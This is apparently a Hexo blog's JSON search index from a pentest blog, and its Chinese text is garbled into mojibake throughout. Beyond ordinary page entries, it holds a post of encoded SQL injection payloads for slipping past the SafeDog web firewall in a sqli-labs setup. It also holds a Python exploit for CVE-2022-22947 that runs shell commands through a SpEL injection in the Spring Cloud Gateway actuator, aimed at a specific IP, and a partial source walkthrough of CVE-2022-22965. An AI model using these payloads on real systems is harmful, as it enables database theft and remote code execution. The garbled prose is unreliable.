{"meta":{"title":"popko's Blog","subtitle":"å‡¸0w0å‡¸","description":"ayaneSama&popko","author":"popko","url":"https://pipimi110.github.io"},"pages":[{"title":"bangumi","date":"2019-02-10T13:32:48.000Z","updated":"2020-03-16T10:41:30.000Z","comments":false,"path":"bangumi/index.html","permalink":"https://pipimi110.github.io/bangumi/index.html","excerpt":"","text":"","keywords":null},{"title":"about","date":"2018-12-12T14:14:36.000Z","updated":"2021-04-19T11:39:21.431Z","comments":false,"path":"about/index.html","permalink":"https://pipimi110.github.io/about/index.html","excerpt":"","text":"[ã‚ã‚„ã­ã•ã¾ã®popko]","keywords":"å…³äº"},{"title":"client","date":"2018-12-20T15:13:35.000Z","updated":"2020-03-16T10:41:30.000Z","comments":false,"path":"client/index.html","permalink":"https://pipimi110.github.io/client/index.html","excerpt":"","text":"ç›´æ¥ä¸‹è½½ or æ‰«ç ä¸‹è½½ï¼š","keywords":"Androidå®¢æˆ·ç«¯"},{"title":"comment","date":"2018-12-20T15:13:48.000Z","updated":"2020-03-16T10:41:30.000Z","comments":true,"path":"comment/index.html","permalink":"https://pipimi110.github.io/comment/index.html","excerpt":"","text":"å¿µä¸¤å¥è¯— å™åˆ«æ¢¦ã€æ‰¬å·ä¸€è§‰ã€‚ ã€å®‹ä»£ã€‘å´æ–‡è‹±ã€Šå¤œæ¸¸å®«Â·äººå»è¥¿æ¥¼é›æ³ã€‹","keywords":"ç•™è¨€æ¿"},{"title":"donate","date":"2018-12-20T15:13:05.000Z","updated":"2020-03-16T10:41:30.000Z","comments":false,"path":"donate/index.html","permalink":"https://pipimi110.github.io/donate/index.html","excerpt":"","text":"","keywords":"è°¢è°¢é¥²ä¸»äº†å–µ~"},{"title":"lab","date":"2019-01-05T13:47:59.000Z","updated":"2020-03-16T10:41:30.000Z","comments":false,"path":"lab/index.html","permalink":"https://pipimi110.github.io/lab/index.html","excerpt":"","text":"sakuraä¸»é¢˜balabala","keywords":"Labå®éªŒå®¤"},{"title":"links","date":"2018-12-19T15:11:06.000Z","updated":"2020-03-16T10:41:30.000Z","comments":true,"path":"links/index.html","permalink":"https://pipimi110.github.io/links/index.html","excerpt":"","text":"","keywords":"å‹äººå¸"},{"title":"music","date":"2018-12-20T15:14:28.000Z","updated":"2020-03-16T10:41:30.000Z","comments":false,"path":"music/index.html","permalink":"https://pipimi110.github.io/music/index.html","excerpt":"","text":"","keywords":"å–œæ¬¢çš„éŸ³ä¹"},{"title":"rss","date":"2018-12-20T15:09:03.000Z","updated":"2020-03-16T10:41:30.000Z","comments":true,"path":"rss/index.html","permalink":"https://pipimi110.github.io/rss/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-12-12T14:14:16.000Z","updated":"2020-03-16T10:41:30.000Z","comments":true,"path":"tags/index.html","permalink":"https://pipimi110.github.io/tags/index.html","excerpt":"","text":""},{"title":"theme-sakura","date":"2019-01-04T14:53:25.000Z","updated":"2020-03-16T10:41:30.000Z","comments":false,"path":"theme-sakura/index.html","permalink":"https://pipimi110.github.io/theme-sakura/index.html","excerpt":"","text":"Hexoä¸»é¢˜Sakuraä¿®æ”¹è‡ªWordPressä¸»é¢˜Sakuraï¼Œæ„Ÿè°¢åŸä½œè€…Mashiro","keywords":"Hexo ä¸»é¢˜ Sakura ğŸŒ¸"},{"title":"video","date":"2018-12-20T15:14:38.000Z","updated":"2020-03-16T10:41:30.000Z","comments":false,"path":"video/index.html","permalink":"https://pipimi110.github.io/video/index.html","excerpt":"","text":"var videos = [ { img: 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: 'æœèŠ±å¤•èª“â€”â€”äºç¦»åˆ«ä¹‹æœæŸèµ·çº¦å®šä¹‹èŠ±', status: 'å·²è¿½å®Œ', progress: 100, jp: 'ã•ã‚ˆãªã‚‰ã®æœã«ç´„æŸã®èŠ±ã‚’ã‹ã–ã‚ã†', time: 'æ”¾é€æ—¶é—´: 2018-02-24 SUN.', desc: ' ä½åœ¨è¿œç¦»å°˜åš£çš„åœŸåœ°ï¼Œä¸€è¾¹å°†æ¯å¤©çš„äº‹æƒ…ç¼–ç»‡æˆåä¸ºå¸Œæ¯”æ¬§çš„å¸ƒï¼Œä¸€è¾¹é™é™ç”Ÿæ´»çš„ä¼Šæ¬§å¤«äººæ°‘ã€‚åœ¨15å²å·¦å³å¤–è¡¨å°±åœæ­¢æˆé•¿ï¼Œæ‹¥æœ‰æ•°ç™¾å¹´å¯¿å‘½çš„ä»–ä»¬ï¼Œè¢«ç§°ä¸ºâ€œç¦»åˆ«çš„ä¸€æ—â€ï¼Œå¹¶è¢«è§†ä¸ºæ´»ç€çš„ä¼ è¯´ã€‚æ²¡æœ‰åŒäº²çš„ä¼Šæ¬§å¤«å°‘å¥³ç›å¥‡äºšï¼Œè¿‡ç€è¢«ä¼™ä¼´åŒ…å›´çš„å¹³ç¨³æ—¥å­ï¼Œå´æ€»æ„Ÿè§‰â€œå­¤èº«ä¸€äººâ€ã€‚ä»–ä»¬çš„è¿™ç§æ—¥å¸¸ï¼Œä¸€ç¬é—´å°±å´©æºƒæ¶ˆå¤±ã€‚è¿½æ±‚ä¼Šæ¬§å¤«çš„é•¿å¯¿ä¹‹è¡€ï¼Œæ¢…è¨è’‚å†›ä¹˜åç€åä¸ºé›·çº³ç‰¹çš„å¤ä»£å…½å‘åŠ¨äº†è¿›æ”»ã€‚åœ¨ç»æœ›ä¸æ··ä¹±ä¹‹ä¸­ï¼Œä¼Šæ¬§å¤«çš„ç¬¬ä¸€ç¾å¥³è•¾è‰äºšè¢«æ¢…è¨è’‚å¸¦èµ°ï¼Œè€Œç›å¥‡äºšæš—æ‹çš„å°‘å¹´å…‹é‡Œå§†ä¹Ÿå¤±è¸ªäº†ã€‚ç›å¥‡äºšè™½ç„¶æ€»ç®—é€ƒè„±äº†ï¼Œå´å¤±å»äº†ä¼™ä¼´å’Œå½’å»ä¹‹åœ°â€¦â€¦ã€‚' }, { img : 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: 'æœèŠ±å¤•èª“â€”â€”äºç¦»åˆ«ä¹‹æœæŸèµ·çº¦å®šä¹‹èŠ±', status: 'å·²è¿½å®Œ', progress: 100, jp: 'ã•ã‚ˆãªã‚‰ã®æœã«ç´„æŸã®èŠ±ã‚’ã‹ã–ã‚ã†', time: '2018-02-24 SUN.', desc: ' ä½åœ¨è¿œç¦»å°˜åš£çš„åœŸåœ°ï¼Œä¸€è¾¹å°†æ¯å¤©çš„äº‹æƒ…ç¼–ç»‡æˆåä¸ºå¸Œæ¯”æ¬§çš„å¸ƒï¼Œä¸€è¾¹é™é™ç”Ÿæ´»çš„ä¼Šæ¬§å¤«äººæ°‘ã€‚åœ¨15å²å·¦å³å¤–è¡¨å°±åœæ­¢æˆé•¿ï¼Œæ‹¥æœ‰æ•°ç™¾å¹´å¯¿å‘½çš„ä»–ä»¬ï¼Œè¢«ç§°ä¸ºâ€œç¦»åˆ«çš„ä¸€æ—â€ï¼Œå¹¶è¢«è§†ä¸ºæ´»ç€çš„ä¼ è¯´ã€‚æ²¡æœ‰åŒäº²çš„ä¼Šæ¬§å¤«å°‘å¥³ç›å¥‡äºšï¼Œè¿‡ç€è¢«ä¼™ä¼´åŒ…å›´çš„å¹³ç¨³æ—¥å­ï¼Œå´æ€»æ„Ÿè§‰â€œå­¤èº«ä¸€äººâ€ã€‚ä»–ä»¬çš„è¿™ç§æ—¥å¸¸ï¼Œä¸€ç¬é—´å°±å´©æºƒæ¶ˆå¤±ã€‚è¿½æ±‚ä¼Šæ¬§å¤«çš„é•¿å¯¿ä¹‹è¡€ï¼Œæ¢…è¨è’‚å†›ä¹˜åç€åä¸ºé›·çº³ç‰¹çš„å¤ä»£å…½å‘åŠ¨äº†è¿›æ”»ã€‚åœ¨ç»æœ›ä¸æ··ä¹±ä¹‹ä¸­ï¼Œä¼Šæ¬§å¤«çš„ç¬¬ä¸€ç¾å¥³è•¾è‰äºšè¢«æ¢…è¨è’‚å¸¦èµ°ï¼Œè€Œç›å¥‡äºšæš—æ‹çš„å°‘å¹´å…‹é‡Œå§†ä¹Ÿå¤±è¸ªäº†ã€‚ç›å¥‡äºšè™½ç„¶æ€»ç®—é€ƒè„±äº†ï¼Œå´å¤±å»äº†ä¼™ä¼´å’Œå½’å»ä¹‹åœ°â€¦â€¦ã€‚' } ] .should-ellipsis{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:95%;}.should-ellipsis-full{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:100%;}.should-ellipsis i{position:absolute;right:24px;}.grey-text{color:#9e9e9e !important}.grey-text.text-darken-4{color:#212121 !important}html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}img{border-style:none}progress{display:inline-block;vertical-align:baseline}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}html{-webkit-box-sizing:border-box;box-sizing:border-box}*,*:before,*:after{-webkit-box-sizing:inherit;box-sizing:inherit}ul:not(.browser-default){padding-left:0;list-style-type:none}ul:not(.browser-default)>li{list-style-type:none}.card{-webkit-box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2);box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2)}.hoverable{-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s}.hoverable:hover{-webkit-box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19);box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19)}i{line-height:inherit}i.right{float:right;margin-left:15px}.bangumi .right{float:right !important}.material-icons{text-rendering:optimizeLegibility;-webkit-font-feature-settings:'liga';-moz-font-feature-settings:'liga';font-feature-settings:'liga'}.row{margin-left:auto;margin-right:auto;margin-bottom:20px}.row:after{content:\"\";display:table;clear:both}.row .col{float:left;-webkit-box-sizing:border-box;box-sizing:border-box;padding:0 .75rem;min-height:1px}.row .col.s12{width:100%;margin-left:auto;left:auto;right:auto}@media only screen and (min-width:601px){.row .col.m6{width:50%;margin-left:auto;left:auto;right:auto}}html{line-height:1.5;font-family:-apple-system,BlinkMacSystemFont,\"Segoe UI\",Roboto,Oxygen-Sans,Ubuntu,Cantarell,\"Helvetica Neue\",sans-serif;font-weight:normal;color:rgba(0,0,0,0.87)}@media only screen and (min-width:0){html{font-size:14px}}@media only screen and (min-width:992px){html{font-size:14.5px}}@media only screen and (min-width:1200px){html{font-size:15px}}.card{position:relative;margin:.5rem 0 1rem 0;background-color:#fff;-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s;border-radius:2px}.card .card-title{font-size:24px;font-weight:300}.card .card-title.activator{cursor:pointer}.card .card-image{position:relative}.card .card-image img{display:block;border-radius:2px 2px 0 0;position:relative;left:0;right:0;top:0;bottom:0;width:100%}.card .card-content{padding:24px;border-radius:0 0 2px 2px}.card .card-content p{margin:0}.card .card-content .card-title{display:block;line-height:32px;margin-bottom:8px}.card .card-content .card-title i{line-height:32px}.card .card-reveal{padding:24px;position:absolute;background-color:#fff;width:100%;overflow-y:auto;left:0;top:100%;height:100%;z-index:3;display:none}.card .card-reveal .card-title{cursor:pointer;display:block}.waves-effect{position:relative;cursor:pointer;display:inline-block;overflow:hidden;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;-webkit-tap-highlight-color:transparent;vertical-align:middle;z-index:1;-webkit-transition:.3s ease-out;transition:.3s ease-out}.waves-effect img{position:relative;z-index:-1}.waves-block{display:block}::-webkit-input-placeholder{color:#d1d1d1}::-moz-placeholder{color:#d1d1d1}:-ms-input-placeholder{color:#d1d1d1}::-ms-input-placeholder{color:#d1d1d1}[type=\"radio\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"radio\"]:not(:checked)+span{position:relative;padding-left:35px;cursor:pointer;display:inline-block;height:25px;line-height:25px;font-size:1rem;-webkit-transition:.28s ease;transition:.28s ease;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border-radius:50%}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border:2px solid #5a5a5a}[type=\"radio\"]:not(:checked)+span:after{-webkit-transform:scale(0);transform:scale(0)}[type=\"checkbox\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"checkbox\"]:not(:checked):disabled+span:not(.lever):before{border:none;background-color:rgba(0,0,0,0.42)}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):before{width:0;height:0;border:3px solid transparent;left:6px;top:10px;-webkit-transform:rotateZ(37deg);transform:rotateZ(37deg);-webkit-transform-origin:100% 100%;transform-origin:100% 100%}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):after{height:20px;width:20px;background-color:transparent;border:2px solid #5a5a5a;top:0px;z-index:0}input[type=checkbox]:not(:disabled) ~ .lever:active:before,input[type=checkbox]:not(:disabled).tabbed:focus ~ .lever::before{-webkit-transform:scale(2.4);transform:scale(2.4);background-color:rgba(0,0,0,0.08)}input[type=range].focused:focus:not(.active)::-webkit-slider-thumb{-webkit-box-shadow:0 0 0 10px rgba(38,166,154,0.26);box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-moz-range-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-ms-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)} ç•ªç»„è®¡åˆ’ è¿™é‡Œå°†æ˜¯æ°¸è¿œçš„å›å¿† window.onload = function(){ videos.forEach(function(video, i){ $('#rootRow').append(` ${video.title} ${video.jp} ${video.status} ${video.title} ${video.jp} æ”¾é€æ—¶é—´: ${video.time} ${video.desc} ${video.status} `) }) }","keywords":"Bç«™"}],"posts":[{"title":"wafç»•è¿‡","slug":"wafç»•è¿‡","date":"2022-04-05T12:22:06.724Z","updated":"2022-04-05T12:21:22.155Z","comments":true,"path":"2022/04/05/wafç»•è¿‡/","link":"","permalink":"https://pipimi110.github.io/2022/04/05/waf%E7%BB%95%E8%BF%87/","excerpt":"","text":"wafç»•è¿‡å®‰å…¨ç‹—http://down.safedog.cn/download/software/safedogwz_Windows_Help.pdf æ‰¾ä¸åˆ°apacheæœåŠ¡åï¼Œæ’ä»¶å®‰è£…å¤±è´¥ https://wxiaoge.blog.csdn.net/article/details/103912900?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_antiscanv2&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_antiscanv2&amp;utm_relevant_index=2 https://blog.csdn.net/weixin_48776804/article/details/113807682 ç®¡ç†å‘˜cmd cd C:\\tool\\phpstudy\\Apache\\bin å®‰è£…æœåŠ¡ httpd.exe -k install -n apache2.4 å¸è½½æœåŠ¡ httpd.exe -k uninstall -n apache2.4 sc delete apache2.4 win+r services.msc//å¯åŠ¨å¯¹åº”æœåŠ¡ å®‰å…¨ç‹—éœ€è¦ä½¿ç”¨æ–°ç‰ˆæœ¬çš„phpstudy//è€Œä¸”éœ€è¦å¸è½½å®‰å…¨ç‹—é‡è£…ï¼Œæ‰èƒ½å®‰è£…æ’ä»¶æˆåŠŸ sqlæŠ¥é”™ Illegal mix of collations for operation â€˜UNIONâ€™ https://blog.csdn.net/mengmeng2222222/article/details/97912270 https://blog.csdn.net/u013419759/article/details/82184713?spm=1001.2101.3001.6650.6&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-6.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-6.pc_relevant_default show create table users; DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci alter table users convert to character set utf8; DEFAULT CHARSET=utf8 unionæ³¨å…¥https://www.anquanke.com/post/id/263744 http://localhost/sqli-labs-master/Less-1/?id=1%27%20and%201=1--+ ç»•è¿‡ 1&#39; and 1--+ 1&#39; and ord(0x1)--+ 1&#39; and ord(0x0)--+ ç»•è¿‡ order by 1 &#39;order/*/*/by+4--+ ç»•è¿‡ union select // 1%27regexp+&quot;%23&quot;+union+%0A+select+1,2,3--+ 1%27regexp+&quot;%23&quot;+union+%0A+select+1,database(/*!1*/),3--+ åº“ 1%27regexp+&quot;%23&quot;+union+%0A+select+1,(select+group_concat(schema_name)from/*!/*%23*/%0Ainformation_schema.schemata*/),3--+ è¡¨ 1%27regexp+&quot;%23&quot;+union+%0A+select+1,(select+group_concat(table_name)from/*!/*%23*/%0Ainformation_schema.tables+where+table_schema=database()*/),3--+ åˆ— 1%27regexp+&quot;%23&quot;+union+%0A+select+1,(select+group_concat(column_name)from/*!/*%23*/%0Ainformation_schema.columns+where+table_name=&#39;users&#39;*/),3--+ æ•°æ® 1%27regexp+&quot;%23&quot;+union+%0A+select+1,group_concat(username/*1*/),3+from+users--+ 1%27regexp+&quot;%23&quot;+union+%0A+select+1,(select+group_concat(username)from+users),3--+ æŠ¥é”™è¿‡æ»¤updatexml(1,1,1) 1&#39;regexp+&quot;%23&quot;and+(updatexml%0a(1,concat(0x7e,(select+&#39;qwe&#39;)),1))--+ 1&#39;regexp+&quot;%23&quot;and+(updatexml%0a(1,concat(0x7e,(select+group_concat(username)from+users)),1))--+ ç›²æ³¨ç»•è¿‡ if(1,1,0) 1&#39;and+(if(1,1,0))--+ è¿‡æ»¤ =&#39;a&#39; &gt;&lt;`like` 1&#39;and+(if(substr(&#39;abc&#39;,1,1)regexp&#39;^a$&#39;,1,0))--+ å¸ƒå°”ç›²æ³¨ åº“ 1&#39;and+(if(substr((select+group_concat(schema_name)from/*!/*%23*/%0Ainformation_schema.schemata*/),1,1)regexp&#39;^D$&#39;,1,0))--+ è¡¨ 1&#39;and+(if(substr((select+group_concat(table_name)from/*!/*%23*/%0Ainformation_schema.tables+where+table_schema=database()*/),1,1)regexp&#39;^D$&#39;,1,0))--+ åˆ— 1&#39;and+(if(substr((select+group_concat(column_name)from/*!/*%23*/%0Ainformation_schema.columns+where+table_name=&#39;users&#39;*/),1,1)regexp&#39;^D$&#39;,1,0))--+ æ•°æ® 1&#39;and+(if(substr((select+group_concat(username)from+users),1,1)regexp&#39;^D$&#39;,1,0))--+ æ—¶é—´ç›²æ³¨//ç¬¬å…­ä¸ªå­—ç¬¦å¼€å§‹æœ‰æ•ˆ select /*!123456789*/; +------+ | 6789 | +------+ | 6789 | +------+ 1&#39;and+(if(substr((select+group_concat(column_name)from/*!/*%23*/%0Ainformation_schema.columns+where+table_name=&#39;users&#39;*/),1,1)regexp&#39;^D$&#39;,1,sleep(/*!111113*/)))--+ tamperç¼–å†™å¯¹åº”ç»•è¿‡tamper https://xz.aliyun.com/t/10479","categories":[{"name":"pentest","slug":"pentest","permalink":"https://pipimi110.github.io/categories/pentest/"}],"tags":[{"name":"waf","slug":"waf","permalink":"https://pipimi110.github.io/tags/waf/"}],"keywords":[{"name":"pentest","slug":"pentest","permalink":"https://pipimi110.github.io/categories/pentest/"}]},{"title":"spring-cve","slug":"spring-cve","date":"2022-04-04T18:14:33.960Z","updated":"2022-04-04T20:31:55.378Z","comments":true,"path":"2022/04/05/spring-cve/","link":"","permalink":"https://pipimi110.github.io/2022/04/05/spring-cve/","excerpt":"","text":"spring-cvelog4j å…¨å±€æ’é™¤ https://blog.csdn.net/supingemail/article/details/112944282 &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-logging&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;*&lt;/groupId&gt; &lt;artifactId&gt;*&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-log4j2&lt;/artifactId&gt; &lt;/dependency&gt; CVE-2022-22947Spring Cloud Gateway SpELè¡¨è¾¾å¼æ³¨å…¥ åœ¨åŠ¨æ€æ·»åŠ è·¯ç”±çš„è¿‡ç¨‹ä¸­ï¼ŒæŸä¸ªfilterå¯ä»¥å¯¹ä¼ å…¥è¿›æ¥çš„å€¼è¿›è¡ŒSpELè¡¨è¾¾å¼è§£æï¼Œä»è€Œé€ æˆäº†è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ https://mp.weixin.qq.com/s/w3et7TzqZ4ctyybEWQ82HQ å½±å“èŒƒå›´ï¼š Spring Cloud Gateway 3.1.x &lt; 3.1.1 Spring Cloud Gateway &lt; 3.0.7 åˆ†ævulhub åˆ©ç”¨ actuator æä¾›çš„è·¯ç”±æ·»åŠ åŠŸèƒ½ https://docs.spring.io/spring-cloud-gateway/docs/4.0.0-M1/reference/html/#recap-the-list-of-all-endpoints The folloiwng table below summarizes the Spring Cloud Gateway actuator endpoints (note that each endpoint has /actuator/gateway as the base-path): ID HTTP Method Description globalfilters GET Displays the list of global filters applied to the routes. routefilters GET Displays the list of GatewayFilter factories applied to a particular route. refresh POST Clears the routes cache. routes GET Displays the list of routes defined in the gateway. routes/&#123;id&#125; GET Displays information about a particular route. routes/&#123;id&#125; POST Adds a new route to the gateway. routes/&#123;id&#125; DELETE Removes an existing route from the gateway. /actuator/gateway/refresh /actuator/gateway/routefilters /actuator/gateway/globalfilters /actuator/gateway/routes #æŸ¥çœ‹route_id /actuator/gateway/routes/&#123;route_id&#125; GET /actuator/gateway/routes/index HTTP/1.1 è¿”å› {â€œpredicateâ€:â€Methods: [GET]â€,â€route_idâ€:â€indexâ€,â€filtersâ€:[],â€uriâ€:â€http://example.com:80&quot;,&quot;order&quot;:0} Path Type Description id String The route ID. predicates Array The collection of route predicates. Each item defines the name and the arguments of a given predicate. filters Array The collection of filters applied to the route. uri String The destination URI of the route. order Number The route order. æ·»åŠ è·¯ç”± //postæ ¼å¼å‚è€ƒä»getè·å–çš„æ•°æ®æ ¼å¼ https://docs.spring.io/spring-cloud-gateway/docs/4.0.0-M1/reference/html/#gateway-retrieving-information-about-a-particular-route å®˜æ–¹exam &#123; &quot;id&quot;: &quot;first_route&quot;, &quot;predicates&quot;: [&#123; &quot;name&quot;: &quot;Path&quot;, &quot;args&quot;: &#123;&quot;_genkey_0&quot;:&quot;/first&quot;&#125; &#125;], &quot;filters&quot;: [], &quot;uri&quot;: &quot;http://150.158.172.182:7777&quot;, &quot;order&quot;: 0 &#125; ssrf POST /actuator/gateway/routes/new_route HTTP/1.1 Host: 127.0.0.1:8080 Connection: close Content-Type: application/json &#123; &quot;predicate&quot;: &quot;Paths: [/new_route], match trailing slash: true&quot;, &quot;route_id&quot;: &quot;new_route&quot;, &quot;filters&quot;: [ &quot;[[RewritePath /new_route(?&lt;path&gt;.*) = /$&#123;path&#125;], order = 1]&quot; ], &quot;uri&quot;: &quot;https://www.cnpanda.net&quot;, &quot;order&quot;: 0 &#125; SSRFçš„payloadä¸­å¤šäº†å¯¹è¿‡æ»¤å™¨ï¼ˆfiltersï¼‰çš„å…·ä½“å®šä¹‰ expimport requests url = &quot;http://150.158.172.182:60005/&quot; def create(route_id,cmd): burp0_url = url+&quot;actuator/gateway/routes/&quot;+route_id burp0_json = &#123;&quot;filters&quot;: [&#123;&quot;args&quot;: &#123;&quot;name&quot;: &quot;Result&quot;, &quot;value&quot;: &quot;#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\\&quot;%s\\&quot;&#125;).getInputStream()))&#125;&quot;%cmd&#125;, &quot;name&quot;: &quot;AddResponseHeader&quot;&#125;], &quot;uri&quot;: &quot;http://150.158.172.182:7777/qqq&quot;&#125; r = requests.post(burp0_url, json=burp0_json) if r.status_code != 201: print(&quot;create fail&quot;) print(r.text) exit() def clean(route_id): burp0_url = url+&quot;actuator/gateway/routes/&quot;+route_id requests.delete(burp0_url) def fresh(): burp0_url = url+&quot;actuator/gateway/refresh&quot; requests.post(burp0_url) def show(): fresh() burp0_url = url+&quot;actuator/gateway/routes&quot; r=requests.get(burp0_url) print(r.text) route_id = &quot;hacktest&quot; cmd = &quot;whoami&quot; create(route_id,cmd) show() clean(route_id) show() å…¶ä»–spring-cloud-gateway-server æ¨¡å— debug &lt;parent&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-build&lt;/artifactId&gt; &lt;!-- &lt;version&gt;4.0.0-SNAPSHOT&lt;/version&gt;--&gt; &lt;version&gt;3.1.0&lt;/version&gt; &lt;relativePath/&gt; CVE-2022-22965http://blog.o0o.nu/2010/06/cve-2010-1622.html https://mp.weixin.qq.com/s/bG3BCdM-suCZldN7FIpYqw https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/ spring beanæ³¨å…¥ public class Greeting &#123; private long id; private String content; public long getId() &#123; return id; &#125; public void setId(long id) &#123; this.id = id; &#125; @PostMapping(&quot;/greeting&quot;) public String greetingSubmit(@ModelAttribute Greeting greeting, Model model) &#123; return &quot;hello&quot;; &#125; id=1 greeting.getId() class.classloader...=xxx greeting.getClass().getClassloader()... åˆ†æ InvocableHandlerMethod (org.springframework.web.method.support) args[i] = this.resolvers.resolveArgument(parameter, mavContainer, request, this.dataBinderFactory); HandlerMethodArgumentResolverComposite @Nullable public Object resolveArgument(MethodParameter parameter, @Nullable ModelAndViewContainer mavContainer, NativeWebRequest webRequest, @Nullable WebDataBinderFactory binderFactory) throws Exception &#123; HandlerMethodArgumentResolver resolver = this.getArgumentResolver(parameter); if (resolver == null) &#123; throw new IllegalArgumentException(&quot;Unsupported parameter type [&quot; + parameter.getParameterType().getName() + &quot;]. supportsParameter should be called first.&quot;); &#125; else &#123; return resolver.resolveArgument(parameter, mavContainer, webRequest, binderFactory); &#125; &#125; resolveArgument//beanæ³¨å…¥ModelAttributeMethodProcessor public final Object resolveArgument(MethodParameter parameter, @Nullable ModelAndViewContainer mavContainer, NativeWebRequest webRequest, @Nullable WebDataBinderFactory binderFactory) throws Exception &#123; Assert.state(mavContainer != null, &quot;ModelAttributeMethodProcessor requires ModelAndViewContainer&quot;); Assert.state(binderFactory != null, &quot;ModelAttributeMethodProcessor requires WebDataBinderFactory&quot;); String name = ModelFactory.getNameForParameter(parameter); ModelAttribute ann = (ModelAttribute)parameter.getParameterAnnotation(ModelAttribute.class); if (ann != null) &#123; mavContainer.setBinding(name, ann.binding()); &#125; Object attribute = null; BindingResult bindingResult = null; if (mavContainer.containsAttribute(name)) &#123; attribute = mavContainer.getModel().get(name); &#125; else &#123; try &#123; attribute = this.createAttribute(name, parameter, binderFactory, webRequest);//1.createAttribute//ç±»åˆå§‹åŒ– &#125; &#125; ... if (bindingResult == null) &#123; WebDataBinder binder = binderFactory.createBinder(webRequest, attribute, name);//2.createBinder//è®¾ç½®target if (binder.getTarget() != null) &#123; if (!mavContainer.isBindingDisabled(name)) &#123; this.bindRequestParameters(binder, webRequest);//3.bindRequestParameters//å‚æ•°ç»‘å®š &#125; createAttribute//ç±»åˆå§‹åŒ–ServletModelAttributeMethodProcessor protected final Object createAttribute(String attributeName, MethodParameter parameter, WebDataBinderFactory binderFactory, NativeWebRequest request) throws Exception &#123; String value = this.getRequestValueForAttribute(attributeName, request); if (value != null) &#123;//null &#125; return super.createAttribute(attributeName, parameter, binderFactory, request); &#125; //ModelAttributeMethodProcessor protected Object createAttribute(String attributeName, MethodParameter parameter, WebDataBinderFactory binderFactory, NativeWebRequest webRequest) throws Exception &#123; MethodParameter nestedParameter = parameter.nestedIfOptional(); Class&lt;?&gt; clazz = nestedParameter.getNestedParameterType(); Constructor&lt;?&gt; ctor = BeanUtils.getResolvableConstructor(clazz);//æ„é€ å‡½æ•° Object attribute = this.constructAttribute(ctor, attributeName, parameter, binderFactory, webRequest);//ç±»åˆå§‹åŒ– if (parameter != nestedParameter) &#123; attribute = Optional.of(attribute); &#125; return attribute; &#125; protected Object constructAttribute(Constructor&lt;?&gt; ctor, String attributeName, MethodParameter parameter, WebDataBinderFactory binderFactory, NativeWebRequest webRequest) throws Exception &#123; if (ctor.getParameterCount() == 0) &#123;//æ— å‚æ„é€ å‡½æ•° return BeanUtils.instantiateClass(ctor, new Object[0]); &#125; else &#123;//æœ‰å‚æ„é€ å‡½æ•° ... BeanUtils public static &lt;T&gt; Constructor&lt;T&gt; getResolvableConstructor(Class&lt;T&gt; clazz) &#123; Constructor&lt;T&gt; ctor = findPrimaryConstructor(clazz); if (ctor != null) &#123; return ctor; &#125; else &#123; Constructor&lt;?&gt;[] ctors = clazz.getConstructors(); if (ctors.length == 1) &#123; return ctors[0];//è¿”å›æ„é€ å‡½æ•° &#125; else &#123; if (ctors.length == 0) &#123; ctors = clazz.getDeclaredConstructors(); if (ctors.length == 1) &#123; return ctors[0]; &#125; &#125; try &#123; return clazz.getDeclaredConstructor();// ... &#125; &#125; &#125; &#125; public static &lt;T&gt; T instantiateClass(Constructor&lt;T&gt; ctor, Object... args) throws BeanInstantiationException &#123; Assert.notNull(ctor, &quot;Constructor must not be null&quot;); try &#123; ReflectionUtils.makeAccessible(ctor); 